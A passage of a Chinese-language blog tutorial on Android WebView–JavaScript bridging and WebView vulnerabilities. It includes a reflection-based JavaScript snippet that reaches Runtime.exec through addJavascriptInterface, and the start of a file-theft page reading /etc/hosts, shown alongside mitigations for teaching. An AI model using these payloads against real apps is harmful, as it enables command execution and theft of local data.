alt="image-20220729101013208"></p><p>js中就成功的加载了Android中的hello方法</p><p><strong><code>WebViewClient.shouldOverrideUrlLoading ()</code></strong></p><p>具体原理：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)Android通过 WebViewClient 的回调方法shouldOverrideUrlLoading ()拦截 url</span><br><span class="line">(<span class="number">2</span>)解析该 url 的协议</span><br><span class="line">(<span class="number">3</span>)如果检测到是预先约定好的协议，就调用相应方法</span><br></pre></td></tr></table></figure><p>即JS需要调用Android的方法</p><p>具体使用：</p><p>首先，在JS中约定所需要的Url协议，以.html格式放到src&#x2F;main&#x2F;assets文件夹里</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Carson_Ho&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script&gt;</span><br><span class="line">         function <span class="title function_">callAndroid</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="comment">/*约定的url协议为：js://webview?arg1=WindXaa&amp;arg2=attack*/</span></span><br><span class="line">            document.location = <span class="string">&quot;js://webview?arg1=WindXaa&amp;arg2=attack&quot;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">      &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 点击按钮则调用callAndroid（）方法  --&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;button type=<span class="string">&quot;button&quot;</span> id=<span class="string">&quot;button1&quot;</span> onclick=<span class="string">&quot;callAndroid()&quot;</span>&gt;点击调用Android代码&lt;/button&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后我们新建一个类，并编写代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">     <span class="type">WebView</span> <span class="variable">mWebView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview2);</span><br><span class="line"></span><br><span class="line">        <span class="type">WebSettings</span> <span class="variable">webSettings</span> <span class="operator">=</span> mWebView.getSettings();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置与Js交互的权限</span></span><br><span class="line">        webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 设置允许JS弹窗</span></span><br><span class="line">        webSettings.setJavaScriptCanOpenWindowsAutomatically(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 步骤1：加载JS代码</span></span><br><span class="line">        <span class="comment">// 格式规定为:file:///android_asset/文件名.html</span></span><br><span class="line">        mWebView.loadUrl(<span class="string">&quot;file:///android_asset/javascript1.html&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 复写WebViewClient类的shouldOverrideUrlLoading方法</span></span><br><span class="line">        mWebView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>() &#123;</span><br><span class="line">                                      <span class="meta">@Override</span></span><br><span class="line">                                      <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line"></span><br><span class="line">                                          <span class="comment">// 步骤2：根据协议的参数，判断是否是所需要的url</span></span><br><span class="line">                                          <span class="comment">// 一般根据scheme（协议格式） &amp; authority（协议名）判断（前两个参数）</span></span><br><span class="line">                                          <span class="comment">//约定的url协议为：js://webview?arg1=WindXaa&amp;arg2=attack（同时也是约定好的需要拦截的）</span></span><br><span class="line"></span><br><span class="line">                                          <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(url);</span><br><span class="line">                                          <span class="comment">// 如果url的协议 = 预先约定的 js 协议</span></span><br><span class="line">                                          <span class="comment">// 就解析往下解析参数</span></span><br><span class="line">                                          <span class="keyword">if</span> ( uri.getScheme().equals(<span class="string">&quot;js&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                                              <span class="comment">// 如果 authority  = 预先约定协议里的 webview，即代表都符合约定的协议</span></span><br><span class="line">                                              <span class="comment">// 所以拦截url,下面JS开始调用Android需要的方法</span></span><br><span class="line">                                              <span class="keyword">if</span> (uri.getAuthority().equals(<span class="string">&quot;webview&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                                                  <span class="comment">//  步骤3：</span></span><br><span class="line">                                                  <span class="comment">// 执行JS所需要调用的逻辑</span></span><br><span class="line">                                                  System.out.println(<span class="string">&quot;js调用了Android的方法&quot;</span>);</span><br><span class="line">                                                  <span class="comment">// 可以在协议上带有参数并传递到Android上</span></span><br><span class="line">                                                  HashMap&lt;String, String&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">                                                  Set&lt;String&gt; collection = uri.getQueryParameterNames();</span><br><span class="line">                                                  Log.e(<span class="string">&quot;WindXaa&quot;</span>,params.get(<span class="number">0</span>)+<span class="string">&quot;---&quot;</span>+params.get(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                              &#125;</span><br><span class="line"></span><br><span class="line">                                              <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                                          &#125;</span><br><span class="line">                                          <span class="keyword">return</span> <span class="built_in">super</span>.shouldOverrideUrlLoading(view, url);</span><br><span class="line">                                      &#125;</span><br><span class="line">                                  &#125;</span><br><span class="line">        );</span><br></pre></td></tr></table></figure><p>运行程序：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/17.png" alt="image-20220729105941115"></p><p>这里就调用Android代码成功</p><p> <strong><code>WebChromeClient</code> 的<code>onJsAlert()</code>、<code>onJsConfirm()</code>、<code>onJsPrompt（）</code></strong></p><p>在JS中，上面三种方法分别回调l拦截对话框<code>alert()</code>、<code>confirm()</code>、<code>prompt()</code>的信息：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/18.png" alt="image-20220729110247468"></p><p>Android通过 <code>WebChromeClient</code> 的<code>onJsAlert()</code>、<code>onJsConfirm()</code>、<code>onJsPrompt（）</code>方法回调分别拦截JS对话框（即上述三个方法），得到他们的消息内容，然后解析即可</p><p>然后我们再次编写js代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Carson_Ho<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">function</span> <span class="title function_">clickprompt</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 调用prompt（）</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> result=<span class="title function_">prompt</span>(<span class="string">&quot;js://webview?arg1=WindXaa&amp;arg2=attack&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title function_">alert</span>(<span class="string">&quot;demo &quot;</span> + result);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="comment">&lt;!-- 点击按钮则调用clickprompt()  --&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;button1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;clickprompt()&quot;</span>&gt;</span>点击调用Android代码<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>我们编写onJsPrompt 回调方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebView</span> <span class="variable">mWebView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview3);</span><br><span class="line"></span><br><span class="line">      <span class="type">WebSettings</span> <span class="variable">webSettings</span> <span class="operator">=</span> mWebView.getSettings();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 设置与Js交互的权限</span></span><br><span class="line">      webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">      <span class="comment">// 设置允许JS弹窗</span></span><br><span class="line">      webSettings.setJavaScriptCanOpenWindowsAutomatically(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 先加载JS代码</span></span><br><span class="line">      <span class="comment">// 格式规定为:file:///android_asset/文件名.html</span></span><br><span class="line">      mWebView.loadUrl(<span class="string">&quot;file:///android_asset/javascript2.html&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      mWebView.setWebChromeClient(<span class="keyword">new</span> <span class="title class_">WebChromeClient</span>() &#123;</span><br><span class="line">          <span class="comment">// 拦截输入框(原理同方式2)</span></span><br><span class="line">          <span class="comment">// 参数message:代表promt（）的内容（不是url）</span></span><br><span class="line">          <span class="comment">// 参数result:代表输入框的返回值</span></span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onJsPrompt</span><span class="params">(WebView view, String url, String message, String defaultValue, JsPromptResult result)</span> &#123;</span><br><span class="line">              <span class="comment">// 根据协议的参数，判断是否是所需要的url(原理同方式2)</span></span><br><span class="line">              <span class="comment">// 一般根据scheme（协议格式） &amp; authority（协议名）判断（前两个参数）</span></span><br><span class="line"></span><br><span class="line">              <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(message);</span><br><span class="line">              <span class="comment">// 如果url的协议 = 预先约定的 js 协议</span></span><br><span class="line">              <span class="comment">// 就解析往下解析参数</span></span><br><span class="line">              <span class="keyword">if</span> (uri.getScheme().equals(<span class="string">&quot;js&quot;</span>)) &#123;</span><br><span class="line">                  <span class="comment">//js://webview?arg1=WindXaa&amp;arg2=attack</span></span><br><span class="line">                  <span class="comment">// 如果 authority  = 预先约定协议里的 webview，即代表都符合约定的协议</span></span><br><span class="line">                  <span class="comment">// 所以拦截url,下面JS开始调用Android需要的方法</span></span><br><span class="line">                  <span class="keyword">if</span> (uri.getAuthority().equals(<span class="string">&quot;webview&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                      <span class="comment">// 执行JS所需要调用的逻辑</span></span><br><span class="line">                      System.out.println(<span class="string">&quot;js调用了Android的方法&quot;</span>);</span><br><span class="line">                      <span class="comment">// 可以在协议上带有参数并传递到Android上</span></span><br><span class="line">                      HashMap&lt;String, String&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">                      Set&lt;String&gt; collection = uri.getQueryParameterNames();</span><br><span class="line"></span><br><span class="line">                      <span class="comment">//参数result:代表消息框的返回值(输入值)</span></span><br><span class="line">                      result.confirm(<span class="string">&quot;js调用了Android的方法成功啦&quot;</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">return</span> <span class="built_in">super</span>.onJsPrompt(view, url, message, defaultValue, result);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;);</span><br></pre></td></tr></table></figure><p>运行程序：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/19.png" alt="image-20220729143728889"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/20.png" alt="image-20220729143746516"></p><p>我们可以发现这里已经成功的加载了html，然后我们再次点击按钮可以发现通过回调成功的调用了函数，并且显示了弹窗</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/21.png" alt="image-20220729143927623"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/22.png" alt="image-20220729144012571"></p><p>其余两种方法同理：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 拦截JS的警告框</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onJsAlert</span><span class="params">(WebView view, String url, String message, JsResult result)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">super</span>.onJsAlert(view, url, message, result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拦截JS的确认框</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onJsConfirm</span><span class="params">(WebView view, String url, String message, JsResult result)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">super</span>.onJsConfirm(view, url, message, result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="三、WebView的漏洞面"><a href="#三、WebView的漏洞面" class="headerlink" title="三、WebView的漏洞面"></a>三、WebView的漏洞面</h2><p>WebView 漏洞在Android APP中占比十分巨大，根据梆梆安全的《2021年移动安全形势分析与2022年研判》中显示，WebView漏洞总和仍然占据目前Android APP漏洞类别前列，如下图所示：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/23.png" alt="image-20220729145936266"></p><p>因此了解和掌握WebView漏洞的原理和技巧是十分重要的</p><h3 id="1-WebView的漏洞面"><a href="#1-WebView的漏洞面" class="headerlink" title="1.WebView的漏洞面"></a>1.WebView的漏洞面</h3><p>谈起WebView漏洞，我们的目光回退到2020年看雪SDC沙龙会议中，来自OPPO实验室的何恩大佬发表的《Android WebView安全攻防指南2020》的演讲，大佬从WebView的<code>本地攻击面、远程攻击面、特殊攻击面</code>共3个角度讲述了WebView漏洞的成因，原文链接：<a href="https://zhuanlan.kanxue.com/article-14155.htm">Android WebView安全攻防指南2020</a>，这里引用大佬的WebView示例图，如下图所示：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/24.png" alt="image-20220729150558039"></p><p>从图中我们可以看出WebView的漏洞攻击面，从引导组件Intent、deeplink，包括了WebView自身的接口，以及一些端口协议等等攻击面</p><h3 id="2-WebView漏洞发展总结"><a href="#2-WebView漏洞发展总结" class="headerlink" title="2.WebView漏洞发展总结"></a>2.WebView漏洞发展总结</h3><p>考虑到WebView漏洞的攻击面十分的杂乱，这里我对WebView漏洞的发展进行了一个梳理总结，如下所示：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/25.png" alt="image-20220729152654652"></p><p>下面我们就将一一的讲解每个漏洞的原理并进行复现</p><h2 id="四、WebView的漏洞原理和复现"><a href="#四、WebView的漏洞原理和复现" class="headerlink" title="四、WebView的漏洞原理和复现"></a>四、WebView的漏洞原理和复现</h2><h3 id="1-历史漏洞"><a href="#1-历史漏洞" class="headerlink" title="1.历史漏洞"></a>1.历史漏洞</h3><h4 id="（1）WebView任意代码执行漏洞"><a href="#（1）WebView任意代码执行漏洞" class="headerlink" title="（1）WebView任意代码执行漏洞"></a>（1）WebView任意代码执行漏洞</h4><h5 id="lt-1-gt-addJavascriptInterface-接口引起远程代码执行漏洞"><a href="#lt-1-gt-addJavascriptInterface-接口引起远程代码执行漏洞" class="headerlink" title="&lt;1&gt; addJavascriptInterface 接口引起远程代码执行漏洞"></a>&lt;1&gt; addJavascriptInterface 接口引起远程代码执行漏洞</h5><p><strong>漏洞原理：</strong></p><p>我们在上文中讲述过JS和Android直接的通信可以通过<code>addJavascriptInterface</code>接口进行对象映射</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">webView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">JSObject</span>(), <span class="string">&quot;myObj&quot;</span>);</span><br><span class="line"><span class="comment">// 参数1：Android的本地对象</span></span><br><span class="line"><span class="comment">// 参数2：JS的对象</span></span><br><span class="line"><span class="comment">// 通过对象映射将Android中的本地对象和JS中的对象进行关联，从而实现JS调用Android的对象和方法</span></span><br></pre></td></tr></table></figure><p>当JS拿到Android这个对象后，就可以调用这个Android对象中所有的方法，包括系统类（java.lang.Runtime 类），从而进行任意代码执行。</p><p>具体的攻击步骤：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）Android中的对象有一公共的方法：getClass() </span><br><span class="line">（<span class="number">2</span>）该方法可以获取到当前类 类型Class</span><br><span class="line">（<span class="number">3</span>）该类有一关键的方法： Class.forName；</span><br><span class="line">（<span class="number">4</span>）该方法可以加载一个类（可加载 java.lang.Runtime 类）</span><br><span class="line">（<span class="number">5</span>）而该类是可以执行本地命令的</span><br></pre></td></tr></table></figure><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">execute</span><span class="params">(cmdArgs)</span>  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="comment">// 步骤1：遍历 window 对象</span></span><br><span class="line">    <span class="comment">// 目的是为了找到包含 getClass （）的对象</span></span><br><span class="line">    <span class="comment">// 因为Android映射的JS对象也在window中，所以肯定会遍历到</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> obj in window) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;getClass&quot;</span> in window[obj]) &#123;  </span><br><span class="line"></span><br><span class="line">      <span class="comment">// 步骤2：利用反射调用forName（）得到Runtime类对象</span></span><br><span class="line">            alert(obj);          </span><br><span class="line">            <span class="keyword">return</span>  window[obj].getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)  </span><br><span class="line"></span><br><span class="line">      <span class="comment">// 步骤3：以后，就可以调用静态方法来执行一些命令，比如访问文件的命令</span></span><br><span class="line">getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(cmdArgs);  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 从执行命令后返回的输入流中得到字符串，有很严重暴露隐私的危险。</span></span><br><span class="line"><span class="comment">// 如执行完访问文件的命令之后，就可以得到文件名的信息了。</span></span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p><strong>漏洞防护：</strong></p><p>Google在Android4.2以后对调用的函数以<code>@JavascriptInterface</code>进行注解从而避免漏洞攻击，也就是说我们js调用Android的方法，必须要在JavascriptInterface中进行声明，这样才能调用，如我们上文中实现的便是如此</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/30.png" alt="image-20220729164533455"></p><p>后来这种漏洞越来越少，在当前高版本的手机上基本没有了</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/31.png" alt="image-20220729164656332"></p><p>在4.2之前，可以采用拦截prompt（）的方式进行漏洞修复，不过这种版本太过久远，所以我们这里就不细讲了</p><h5 id="lt-2-gt-searchBoxJavaBridge-接口引起远程代码执行漏洞"><a href="#lt-2-gt-searchBoxJavaBridge-接口引起远程代码执行漏洞" class="headerlink" title="&lt;2&gt;searchBoxJavaBridge_接口引起远程代码执行漏洞"></a>&lt;2&gt;searchBoxJavaBridge_接口引起远程代码执行漏洞</h5><p><strong>漏洞原理：</strong></p><p>在Android 3.0以下，Android系统会默认通过<code>searchBoxJavaBridge_</code>的Js接口给 WebView 添加一个JS映射对象：<code>searchBoxJavaBridge_</code>对象，该接口可能被利用，实现远程任意代码。</p><p><strong>安全防护：</strong></p><p>删除<code>searchBoxJavaBridge_</code>接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过调用该方法删除接口</span></span><br><span class="line">removeJavascriptInterface（）;</span><br></pre></td></tr></table></figure><p>而<code>accessibility</code>和 <code>accessibilityTraversal</code>接口引起远程代码执行漏洞的原理和这里相似，由于这些漏洞在当前的Android版本上基本不存在，我们不做深入讲解了。</p><h4 id="（2）WebView明文存储漏洞"><a href="#（2）WebView明文存储漏洞" class="headerlink" title="（2）WebView明文存储漏洞"></a>（2）WebView明文存储漏洞</h4><p><strong>漏洞原理：</strong></p><p>WebView默认开启密码保存功能 ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mWebView.setSavePassword(<span class="literal">true</span>)`</span><br></pre></td></tr></table></figure><p>开启后，在用户输入密码时，会弹出提示框：询问用户是否保存密码；</p><p>如果选择”是”，密码会被明文保到 <code>/data/data/com.package.name/databases/webview.db</code> 中，这样就有被盗取密码的危险</p><p><strong>安全防护：</strong></p><p>通过 WebSettings.setSavePassword(false) 关闭密码保存提醒功能，防止明文密码存在本地被盗用。</p><h3 id="2-跨域漏洞"><a href="#2-跨域漏洞" class="headerlink" title="2.跨域漏洞"></a>2.跨域漏洞</h3><p>2018 年国家信息安全漏洞共享平台（CNVD）发布关于Android平台 WebView 控件存在跨域访问高危漏洞的安全公告 (CNVD-2017-36682)，漏洞产生的原因在Android系统中，WebView 开启了 file 域访问，且允许 file 域对 http 域进行访问，同时未对 file 域的路径进行严格限制所致。攻击者通过 URL Scheme 的方式，可远程打开并加载恶意 HTML 文件，远程获取 APP 中包括用户登录凭证在内的所有本地敏感数据。</p><p>针对WebView的跨域问题，主要是三个重要的API，如下所示：</p><table><thead><tr><th><strong>方法</strong></th><th><strong>作用&#x2F;风险</strong></th><th><strong>默认策略</strong></th></tr></thead><tbody><tr><td>setAllowFileAccess(true);</td><td>设置是否允许 WebView 使用 File 协议</td><td>默认设置为 true</td></tr><tr><td>setAllowFileAccessFromFileURLs(true);</td><td>设置是否允许通过 file url 加载的 Js 代码读取其他的本地文件</td><td>在 Android 4.1 后默认禁止</td></tr><tr><td>setAllowUniversalAccessFromFileURLs(true);</td><td>设置是否允许通过 file url 加载的 Javascript 可以访问其他的源 (包括http、https等源)</td><td>在 Android 4.1 后默认禁止</td></tr><tr><td>setJavaScriptEnabled(true);</td><td>设置是否允许 WebView 使用 JavaScript</td><td>默认不允许</td></tr></tbody></table><h4 id="（1）任意文件窃取1（应用克隆漏洞）"><a href="#（1）任意文件窃取1（应用克隆漏洞）" class="headerlink" title="（1）任意文件窃取1（应用克隆漏洞）"></a>（1）任意文件窃取1（应用克隆漏洞）</h4><p><strong>漏洞原理：</strong></p><p><code>setAllowFileAccess(true) + setAllowFileAccessFromFileURLs(true)</code></p><p>这样使得WebView可以使用File协议，和加载Js代码读取本地文件，或访问http源，这样会导致攻击者操作用户点击后无感知下载恶意的HTML&#x2F;JS，并窃取相关的私有文件信息</p><p><strong>漏洞复现：</strong></p><p>首先我们可以查询Android手机中的<code>/etc/hosts</code>私有文件信息</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/37.png" alt="image-20220729195648955"></p><p>我们怎么利用WebView的跨域漏洞去访问本地的私有目录</p><p>首先我们编写目标JS文件：</p><p>fileAttack.html</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function <span class="title function_">loadXMLDoc</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">var</span> <span class="variable">arm</span> <span class="operator">=</span> <span class="string">&quot;file:///etc/hosts&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> xmlhttp;</span><br><span class="line">    <span class="keyword">if</span> (window.XMLHttpRequest)</span><br><span class="line">    &#123;</span><br><span class="line">        xmlhttp=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.onreadystatechange=function()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//alert(&quot;status is&quot;+xmlhttp.status);</span></span><br><span class="line">        <span class="keyword">if</span> (xmlhttp.readyState==<span class="number">4</span>)</span><br><span 